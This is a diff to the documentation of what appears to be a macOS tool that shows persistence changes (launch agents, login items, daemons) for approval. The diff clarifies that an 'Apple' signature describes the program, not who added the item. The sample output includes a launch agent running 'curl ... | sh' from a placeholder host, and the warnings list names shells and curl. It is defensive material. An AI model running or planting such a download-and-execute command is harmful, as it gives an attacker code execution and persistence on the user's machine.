@@ -20,11 +20,13 @@ $ sudo /usr/local/sbin/backup-gate approve
 + ADDED   Launch agent (user you): com.example.updater
            file     /Users/you/Library/LaunchAgents/com.example.updater.plist  (you staff 644)
            runs     /bin/bash -c 'curl -s https://example.invalid/u | sh'
-           signer   Apple
+           program signed by  Apple (built into macOS)
+           note     the program is part of macOS, but the item that starts it was added
+                    by someone else: this signature says nothing about who added it
            ! starts bash: what it does depends on the arguments above
 + ADDED   Login item (you): com.clipy-app.Clipy
            item     /Applications/Clipy.app
-           signer   Developer ID Application: Shunsuke Furubayashi (BBCHAJ584H)
+           program signed by  Developer ID Application: Shunsuke Furubayashi (BBCHAJ584H)
 - REMOVED Background daemon (runs as root): us.zoom.updater.install
 
 Approve only if every change is something you (or an update you ran) did.
@@ -133,8 +135,10 @@ For each change, `approve` shows:
 - **what kind of item it is** in plain words (launch daemon running as root, login item, sudo
   rule...) and whether it was added, removed or changed
 - **what it runs:** the full command line from the launchd plist
-- **who signed the program.** This is checked against Apple's certificate chain, not taken from
-  the certificate's name, so a self-signed "Apple" certificate shows up as `UNTRUSTED`
+- **who signed the program it starts.** This is checked against Apple's certificate chain, not
+  taken from the certificate's name, so a self-signed "Apple" certificate shows up as `UNTRUSTED`.
+  It describes the program, not the item: an item that starts a built-in macOS program (like
+  `bash` or `osascript`) shows "Apple" even though someone else added it, and `approve` says so
 - **warnings** for programs that are unsigned, missing, start a shell or script interpreter
   (`bash -c ...`, `osascript`, `curl`), or run from a temporary, shared or hidden folder
 
